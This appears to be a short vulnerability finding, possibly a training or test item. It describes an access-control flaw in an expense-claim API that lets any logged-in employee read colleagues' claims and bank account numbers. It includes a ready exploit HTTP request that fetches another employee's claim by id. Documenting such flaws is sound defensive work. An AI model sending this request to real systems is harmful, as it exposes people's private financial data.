diagnosis: Knex query retrieves an expense claim by id without checking employee_id === ctx.user.employeeId. Any authenticated employee can query colleagues' expense claim amounts, vendor receipts, and reimbursement bank account numbers.
exploit_request:
POST /trpc/expense.getExpenseDetails?batch=1 HTTP/1.1
Host: expenses.corp.internal
Content-Type: application/json
Cookie: session=employee_session

{"0": {"expenseId": 4091}}
